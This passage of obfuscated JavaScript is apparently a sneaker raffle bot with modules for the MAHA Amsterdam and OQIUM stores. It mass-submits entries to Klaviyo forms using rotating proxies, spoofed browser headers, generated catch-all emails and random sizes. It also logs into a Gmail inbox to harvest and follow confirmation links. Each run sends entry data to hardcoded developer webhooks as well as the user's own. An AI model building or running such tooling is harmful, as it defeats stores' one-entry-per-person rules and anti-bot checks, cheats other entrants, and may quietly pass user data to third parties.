                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x707151, _0x17e7b1, _0x4b05f6) {
                    for (var _0x5dab87 = 0x0; _0x5dab87 < _0x17e7b1['length']; _0x5dab87++) {
                        async function _0x1ef5c7(_0x392f0f, _0x1d5c6c, _0x3ab495, _0x367cbb, _0x5a3d01) {
                            var _0x4f97da, _0x2b8798 = {}, _0x5e4dba = [], _0x528904 = {}, _0xb84035 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x41e76b = Math['round'](Math['random']() * (_0xb84035['length'] - 0x1));
                            _0x367cbb[_0x392f0f]['Size'] == 'RANDOM' && (_0x367cbb[_0x392f0f]['Size'] = _0xb84035[_0x41e76b]);
                            !_0x367cbb && (_0x367cbb = {});
                            if (_0x1d5c6c != 'ver') {
                                _0x50109a(_0x3ab495['name'] + '\x20Task\x20' + (_0x392f0f + 0x1) + '\x20/\x20' + _0x367cbb['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x367cbb, _0x392f0f), _0x2b8798 = _0x3ab495['data'];
                                _0x1d5c6c == 'exp' ? _0x2b8798['data']['attributes']['email'] = '' + _0x367cbb[_0x392f0f]['FirstName'] + _0x367cbb[_0x392f0f]['LastName'] + _0x37b240['catchall'] : _0x2b8798['data']['attributes']['email'] = '' + _0x367cbb[_0x392f0f]['Email'];
                                if (_0x367cbb[_0x392f0f]['Size'] == 'RANDOM') {
                                }
                                _0x2b8798['data']['attributes']['properties']['$first_name'] = '' + _0x367cbb[_0x392f0f]['FirstName'], _0x2b8798['data']['attributes']['properties']['$last_name'] = '' + _0x367cbb[_0x392f0f]['LastName'], _0x2b8798['data']['attributes']['properties']['$address1'] = _0x367cbb[_0x392f0f]['Address1'] + '\x20' + _0x367cbb[_0x392f0f]['Address2'] + '\x20' + _0x367cbb[_0x392f0f]['HouseNumber'], _0x2b8798['data']['attributes']['properties']['$zip'] = '' + _0x367cbb[_0x392f0f]['Zip'], _0x2b8798['data']['attributes']['properties']['$city'] = '' + _0x367cbb[_0x392f0f]['City'], _0x2b8798['data']['attributes']['properties']['$country'] = '' + _0x367cbb[_0x392f0f]['Country'], _0x2b8798['data']['attributes']['properties']['Size'] = '' + _0x367cbb[_0x392f0f]['Size'], _0x2b8798['data']['attributes']['properties']['$phone_number'] = '' + _0x367cbb[_0x392f0f]['Phone'], _0x2b8798['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x367cbb[_0x392f0f]['Follower'];
                            }
                            if (_0x37b240['useRandomProxy'] = ![])
                                var _0x3f76e6 = _0x5a3d01[_0x392f0f]['split'](':');
                            else
                                var _0x8b175 = Math['round'](Math['random']() * (_0x5a3d01['length'] - 0x1)), _0x3f76e6 = _0x5a3d01[_0x8b175]['split'](':');
                            var _0x50d867 = {
                                'jar': _0x1945a2,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x3ab495['url'],
                                'headers': _0x3ab495['headers'],
                                'body': JSON['stringify'](_0x2b8798),
                                'proxy': 'http://' + _0x3f76e6[0x2] + ':' + _0x3f76e6[0x3] + '@' + _0x3f76e6[0x0] + ':' + _0x3f76e6[0x1]
                            };
                            return _0x1d5c6c != 'ver' && (_0x50d867['url'] = _0x3ab495['url'], _0x50d867['headers'] = _0x3ab495['headers']), _0x1d5c6c == 'ver' && (_0x50d867['method'] = 'GET'), new Promise(function (_0x44fc43, _0x49b88d) {
                                callback = async (_0x4778b9, _0x7817c6, _0x3f3810) => {
                                    if (!_0x4778b9 && _0x7817c6['statusCode'] == 0xca || !_0x4778b9 && _0x7817c6['statusCode'] == 0xc8) {
                                        if (_0x1d5c6c != 'ver') {
                                            var _0xeaf9d7 = await _0xb1aeae(_0x367cbb[_0x392f0f], _0x3ab495, 'dev', ![]), _0x4b7797 = await _0xb1aeae(_0x367cbb[_0x392f0f], _0x3ab495, 'pub', ![]);
                                            const _0x2c3387 = {
                                                'succesDEVMSG': { 'embeds': [_0xeaf9d7] },
                                                'succesPUBMSG': { 'embeds': [_0x4b7797] }
                                            };
                                            if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                                                try {
                                                    await _0x40545a(_0x37b240['webhook'], _0x2c3387['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x2c3387['succesDEVMSG']), await _0x28bb81(0xc8);
                                            try {
                                                await _0x40545a(_0x4a9ac0, _0x2c3387['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x4d8543(_0x367cbb[_0x392f0f], _0x3ab495);
                                        }
                                        _0x44fc43(console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x3ab495['name'] + ']\x20Task\x20' + (_0x392f0f + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x1d5c6c != 'ver') {
                                            var _0x283522 = '' + _0x4778b9, _0x4cf6ba = await _0xb1aeae(_0x367cbb[_0x392f0f], _0x3ab495, 'dev', !![], _0x283522), _0x871751 = {};
                                            _0x871751['errorDEV'] = { 'embeds': [_0x4cf6ba] }, _0x1322f8(_0x367cbb[_0x392f0f], _0x3ab495), _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x871751['errorDEV']), await _0x40545a(_0x2b1b7c, _0x871751['errorDEV']);
                                        }
                                        _0x49b88d(console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x3ab495['name'] + ']\x20Task\x20' + (_0x392f0f + 0x1) + ':\x20' + _0x4778b9)));
                                    }
                                };
                                try {
                                    _0x1d5c6c != 'ver' && console['log'](_0x51d312() + '\x20[' + _0x3ab495['name'] + ']\x20Task\x20' + (_0x392f0f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2b8798['data']['attributes']['email']), _0x1f14da(_0x50d867, callback);
                                } catch (_0x4f1594) {
                                    console['log'](_0x51d312() + '\x20Task\x20' + (_0x392f0f + 0x1) + ':\x20' + _0x4f1594);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x1ef5c7(_0x5dab87, 'nor', _0x707151, _0x17e7b1, _0x4b05f6), console['log'](_0x51d312() + '\x20[' + _0x707151['name'] + ']\x20Sleeping\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        } catch (_0x1002b1) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1ac06b, _0x453e1e, _0x4a1020) {
                    var _0x1508df = [];
                    async function _0x597001() {
                        var _0x52fd61 = new _0x575543({
                            'user': _0x37b240['masterMail'],
                            'password': _0x37b240['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xf44b53(_0x2a0676) {
                            _0x52fd61['openBox']('INBOX', ![], _0x2a0676);
                        }
                        _0x52fd61['once']('ready', function () {
                            _0xf44b53(function (_0x419867, _0x6845ff) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x419867)
                                    throw _0x419867;
                                _0x52fd61['seq']['search'](['UNSEEN'], function (_0x5e1f2b, _0x4fe6f5) {
                                    if (!_0x4fe6f5 || !_0x4fe6f5['length'])
                                        console['log'](_0x51d312() + '\x20[' + _0x1ac06b['name'] + ']\x20No\x20mails\x20found'), _0x52fd61['end']();
                                    else {
                                        var _0x15eba3 = _0x52fd61['seq']['fetch'](_0x4fe6f5, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x15eba3['on']('message', function (_0x5d1ff7, _0x216c13) {
                                            var _0x3b8df2 = '(#' + _0x216c13 + ')\x20';
                                            _0x5d1ff7['on']('body', function (_0x157ab2, _0x28c741) {
                                                _0x565ceb(_0x157ab2, (_0x3bbe04, _0x563dd5) => {
                                                    if (_0x563dd5['subject'] == 'Confirm\x20Your\x20Subscription' && _0x563dd5['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0x5dff8e = _0x563dd5['text']['split']('(')[0x1], _0x27d674 = _0x5dff8e['split'](')')[0x0];
                                                        _0x1508df['push'](_0x27d674);
                                                    }
                                                });
                                            }), _0x5d1ff7['once']('end', function () {
                                            });
                                        }), _0x15eba3['once']('error', function (_0xc30a1) {
                                            console['log']('Fetch\x20error:\x20' + _0xc30a1);
                                        }), _0x15eba3['once']('end', function () {
                                            _0x52fd61['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x52fd61['once']('error', function (_0x461a98) {
                            console['log'](_0x2367c9['red'](_0x461a98['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x52fd61['once']('end', async function () {
                        }), _0x52fd61['connect']();
                    }
                    async function _0x5bf0ef(_0x5da0f8, _0x210956, _0x415e09) {
                        for (var _0x2e2319 = 0x0; _0x2e2319 < _0x210956['length']; _0x2e2319++) {
                            async function _0x488c34(_0x503c71, _0x599321, _0x2bdf33, _0x2ceec9, _0x39fd9c) {
                                var _0x5b92e2, _0x2bcb01 = {}, _0x46780e = [], _0x42a58e = {}, _0x494945 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2c2cfa = Math['round'](Math['random']() * (_0x494945['length'] - 0x1));
                                _0x2ceec9[_0x503c71]['Size'] == 'RANDOM' && (_0x2ceec9[_0x503c71]['Size'] = _0x494945[_0x2c2cfa]);
                                !_0x2ceec9 && (_0x2ceec9 = {});
                                if (_0x37b240['useRandomProxy'] = ![])
                                    var _0x4323d1 = _0x39fd9c[_0x503c71]['split'](':');
                                else
                                    var _0x1afcd0 = Math['round'](Math['random']() * (_0x39fd9c['length'] - 0x1)), _0x4323d1 = _0x39fd9c[_0x1afcd0]['split'](':');
                                var _0x3cde74 = {
                                    'jar': _0x1945a2,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2bdf33['url'],
                                    'headers': _0x2bdf33['headers'],
                                    'body': JSON['stringify'](_0x2bcb01),
                                    'proxy': 'http://' + _0x4323d1[0x2] + ':' + _0x4323d1[0x3] + '@' + _0x4323d1[0x0] + ':' + _0x4323d1[0x1]
                                };
                                return _0x599321 != 'ver' && (_0x3cde74['url'] = _0x2bdf33['url'], _0x3cde74['headers'] = _0x2bdf33['headers']), _0x599321 == 'ver' && (_0x3cde74['method'] = 'GET', _0x3cde74['url'] = _0x2ceec9[_0x503c71]), new Promise(function (_0x2e39b6, _0x512fe9) {
                                    callback = async (_0x35a922, _0x2bcb74, _0x46719c) => {
                                        if (!_0x35a922 && _0x2bcb74['statusCode'] == 0xca || !_0x35a922 && _0x2bcb74['statusCode'] == 0xc8) {
                                            if (_0x599321 != 'ver') {
                                                var _0x28702f = await _0xb1aeae(_0x2ceec9[_0x503c71], _0x2bdf33, 'dev', ![]), _0x642eb8 = await _0xb1aeae(_0x2ceec9[_0x503c71], _0x2bdf33, 'pub', ![]);
                                                const _0x244c8f = {
                                                    'succesDEVMSG': { 'embeds': [_0x28702f] },
                                                    'succesPUBMSG': { 'embeds': [_0x642eb8] }
                                                };
                                                if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                                                    try {
                                                        await _0x40545a(_0x37b240['webhook'], _0x244c8f['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x244c8f['succesDEVMSG']), await _0x28bb81(0xc8);
                                                try {
                                                    await _0x40545a(_0x4a9ac0, _0x244c8f['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4d8543(_0x2ceec9[_0x503c71], _0x2bdf33);
                                            }
                                            _0x2e39b6(console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x2bdf33['name'] + ']\x20Task\x20' + (_0x503c71 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x599321 != 'ver') {
                                                var _0x10e804 = '' + _0x35a922, _0x263b81 = await _0xb1aeae(_0x2ceec9[_0x503c71], _0x2bdf33, 'dev', !![], _0x10e804), _0x313f48 = {};
                                                _0x313f48['errorDEV'] = { 'embeds': [_0x263b81] }, _0x1322f8(_0x2ceec9[_0x503c71], _0x2bdf33), _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x313f48['errorDEV']), await _0x40545a(_0x2b1b7c, _0x313f48['errorDEV']);
                                            }
                                            _0x512fe9(console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x2bdf33['name'] + ']\x20Task\x20' + (_0x503c71 + 0x1) + ':\x20' + _0x35a922)));
                                        }
                                    };
                                    try {
                                        _0x599321 != 'ver' ? console['log'](_0x51d312() + '\x20[' + _0x2bdf33['name'] + ']\x20Task\x20' + (_0x503c71 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2bcb01['data']['attributes']['email']) : console['log'](_0x51d312() + '\x20[' + _0x2bdf33['name'] + ']\x20Task\x20' + (_0x503c71 + 0x1) + ':\x20Fetching\x20Response'), _0x1f14da(_0x3cde74, callback);
                                    } catch (_0x1ad085) {
                                        console['log'](_0x51d312() + '\x20Task\x20' + (_0x503c71 + 0x1) + ':\x20' + _0x1ad085);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x488c34(_0x2e2319, 'ver', _0x5da0f8, _0x210956, _0x415e09), console['log'](_0x51d312() + '\x20[' + _0x5da0f8['name'] + ']\x20Sleeping\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                            } catch (_0x2cd0ff) {
                            }
                        }
                    }
                    try {
                        _0x597001(), await _0x28bb81(0xfa0), console['log']('Found\x20' + _0x1508df['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x28bb81(0x9c4);
                    }
                    await _0x5bf0ef(_0x1ac06b, _0x1508df, _0x4a1020);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5ae3d1, _0x43683b, _0x43c012) {
                    for (var _0x33e313 = 0x0; _0x33e313 < _0x43683b['length']; _0x33e313++) {
                        async function _0x3fae4b(_0x2e6129, _0x32905b, _0x1ef2f4, _0x176f8e, _0x254588) {
                            var _0x46eab1, _0x4e277f = {}, _0x1cec0c = [], _0x24229e = {}, _0x25ec04 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x568cea = Math['round'](Math['random']() * (_0x25ec04['length'] - 0x1));
                            _0x176f8e[_0x2e6129]['Size'] == 'RANDOM' && (_0x176f8e[_0x2e6129]['Size'] = _0x25ec04[_0x568cea]);
                            !_0x176f8e && (_0x176f8e = {});
                            if (_0x32905b != 'ver') {
                                _0x50109a(_0x1ef2f4['name'] + '\x20Task\x20' + (_0x2e6129 + 0x1) + '\x20/\x20' + _0x176f8e['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x176f8e, _0x2e6129), _0x1cec0c = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x340f37
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x176f8e[_0x2e6129]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x37b240['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x2de2a3
                                        }
                                    ]
                                }], _0x24229e = { 'embeds': _0x1cec0c }, _0x4e277f = _0x1ef2f4['data'];
                                _0x32905b == 'exp' ? _0x4e277f['data']['attributes']['email'] = '' + _0x176f8e[_0x2e6129]['FirstName'] + _0x176f8e[_0x2e6129]['LastName'] + _0x37b240['catchall'] : _0x4e277f['data']['attributes']['email'] = '' + _0x176f8e[_0x2e6129]['Email'];
                                if (_0x176f8e[_0x2e6129]['Size'] == 'RANDOM') {
                                }
                                _0x4e277f['data']['attributes']['properties']['$first_name'] = '' + _0x176f8e[_0x2e6129]['FirstName'], _0x4e277f['data']['attributes']['properties']['$last_name'] = '' + _0x176f8e[_0x2e6129]['LastName'], _0x4e277f['data']['attributes']['properties']['$address1'] = _0x176f8e[_0x2e6129]['Address1'] + '\x20' + _0x176f8e[_0x2e6129]['Address2'] + '\x20' + _0x176f8e[_0x2e6129]['HouseNumber'], _0x4e277f['data']['attributes']['properties']['$zip'] = '' + _0x176f8e[_0x2e6129]['Zip'], _0x4e277f['data']['attributes']['properties']['$city'] = '' + _0x176f8e[_0x2e6129]['City'], _0x4e277f['data']['attributes']['properties']['$country'] = '' + _0x176f8e[_0x2e6129]['Country'], _0x4e277f['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x176f8e[_0x2e6129]['Size'], _0x4e277f['data']['attributes']['properties']['$phone_number'] = '' + _0x176f8e[_0x2e6129]['Phone'], _0x4e277f['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x176f8e[_0x2e6129]['Follower'];
                            }
                            if (_0x37b240['useRandomProxy'] = ![])
                                var _0x452eca = _0x254588[_0x2e6129]['split'](':');
                            else
                                var _0x26e15a = Math['round'](Math['random']() * (_0x254588['length'] - 0x1)), _0x452eca = _0x254588[_0x26e15a]['split'](':');
                            var _0x44e69a = {
                                'jar': _0x1945a2,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x1ef2f4['url'],
                                'headers': _0x1ef2f4['headers'],
                                'body': JSON['stringify'](_0x4e277f),
                                'proxy': 'http://' + _0x452eca[0x2] + ':' + _0x452eca[0x3] + '@' + _0x452eca[0x0] + ':' + _0x452eca[0x1]
                            };
                            return _0x32905b != 'ver' && (_0x44e69a['url'] = _0x1ef2f4['url'], _0x44e69a['headers'] = _0x1ef2f4['headers']), _0x32905b == 'ver' && (_0x44e69a['method'] = 'GET'), new Promise(function (_0x12b5f0, _0x2ec99e) {
                                callback = async (_0xd22cda, _0x365f83, _0x7907c7) => {
                                    if (!_0xd22cda && _0x365f83['statusCode'] == 0xca || !_0xd22cda && _0x365f83['statusCode'] == 0xc8) {
                                        if (_0x32905b != 'ver') {
                                            var _0x33ddfb = await _0xb1aeae(_0x176f8e[_0x2e6129], _0x1ef2f4, 'dev', ![]), _0x5e1186 = await _0xb1aeae(_0x176f8e[_0x2e6129], _0x1ef2f4, 'pub', ![]);
                                            const _0x2634a2 = {
                                                'succesDEVMSG': { 'embeds': [_0x33ddfb] },
                                                'succesPUBMSG': { 'embeds': [_0x5e1186] }
                                            };
                                            if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                                                try {
                                                    await _0x40545a(_0x37b240['webhook'], _0x2634a2['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x2634a2['succesDEVMSG']), await _0x28bb81(0xc8);
                                            try {
                                                await _0x40545a(_0x4a9ac0, _0x2634a2['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x4d8543(_0x176f8e[_0x2e6129], _0x1ef2f4);
                                        }
                                        _0x12b5f0(console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x1ef2f4['name'] + ']\x20Task\x20' + (_0x2e6129 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x32905b != 'ver') {
                                            var _0x789805 = '' + _0xd22cda, _0x3c0343 = await _0xb1aeae(_0x176f8e[_0x2e6129], _0x1ef2f4, 'dev', !![], _0x789805), _0x5f0cd1 = {};
                                            _0x5f0cd1['errorDEV'] = { 'embeds': [_0x3c0343] }, _0x1322f8(_0x176f8e[_0x2e6129], _0x1ef2f4), _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x5f0cd1['errorDEV']), await _0x40545a(_0x2b1b7c, _0x5f0cd1['errorDEV']);
                                        }
                                        _0x2ec99e(console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x1ef2f4['name'] + ']\x20Task\x20' + (_0x2e6129 + 0x1) + ':\x20' + _0xd22cda)));
                                    }
                                };
                                try {
                                    _0x32905b != 'ver' && console['log'](_0x51d312() + '\x20[' + _0x1ef2f4['name'] + ']\x20Task\x20' + (_0x2e6129 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4e277f['data']['attributes']['email']), _0x1f14da(_0x44e69a, callback);
                                } catch (_0x53a87a) {
                                    console['log'](_0x51d312() + '\x20Task\x20' + (_0x2e6129 + 0x1) + ':\x20' + _0x53a87a);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x3fae4b(_0x33e313, 'nor', _0x5ae3d1, _0x43683b, _0x43c012), console['log'](_0x51d312() + '\x20[' + _0x5ae3d1['name'] + ']\x20Sleeping\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        } catch (_0x339de0) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x298159, _0xc354db, _0x3a6330) {
                    var _0xc354db = [];
                    async function _0x15a848() {
                        var _0x538475 = new _0x575543({
                            'user': _0x37b240['masterMail'],
                            'password': _0x37b240['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x507c5b(_0x4b2377) {
                            _0x538475['openBox']('INBOX', ![], _0x4b2377);
                        }
                        _0x538475['once']('ready', function () {
                            _0x507c5b(function (_0x3cf03e, _0x250b8d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3cf03e)
                                    throw _0x3cf03e;
                                _0x538475['seq']['search'](['UNSEEN'], function (_0x2d366f, _0x41229f) {
                                    if (!_0x41229f || !_0x41229f['length'])
                                        console['log'](_0x51d312() + '\x20[' + _0x298159['name'] + ']\x20No\x20mails\x20found'), _0x538475['end']();
                                    else {
                                        var _0x48d570 = _0x538475['seq']['fetch'](_0x41229f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x48d570['on']('message', function (_0x3f6053, _0x2eca9d) {
                                            var _0x13c8d4 = '(#' + _0x2eca9d + ')\x20';
                                            _0x3f6053['on']('body', function (_0x261df4, _0x23b9f1) {
                                                _0x565ceb(_0x261df4, (_0x214c34, _0x28d622) => {
                                                    if (_0x28d622['subject'] == 'Confirm\x20Your\x20Subscription' && _0x28d622['from']['value'][0x0]['name'] == 'OQIUM') {
                                                        var _0x499cba = _0x28d622['text']['split']('(')[0x1], _0x27853f = _0x499cba['split'](')')[0x0];
                                                        _0xc354db['push'](_0x27853f);
                                                    }
                                                });
                                            }), _0x3f6053['once']('end', function () {
                                            });
